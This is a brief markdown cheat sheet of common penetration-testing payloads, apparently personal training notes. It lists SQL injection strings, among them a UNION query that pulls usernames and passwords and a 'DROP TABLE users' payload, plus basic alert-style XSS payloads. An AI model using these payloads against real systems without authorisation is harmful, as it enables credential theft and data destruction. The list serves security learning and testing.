#  Common Penetration Testing Payloads
These are some common tests that I have found to be useful in my every day pen testing training.

---

##  Injection Attacks

###  SQL Injection (SQLi)
```sql
OR 1=1--
admin'--
' UNION SELECT NULL, username, password FROM users--
admin' OR '1'='1
'; DROP TABLE users;--
```


##  Cross-Site Scripting (XSS)

###  Basic Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src="javascript:alert('XSS')">
```


---
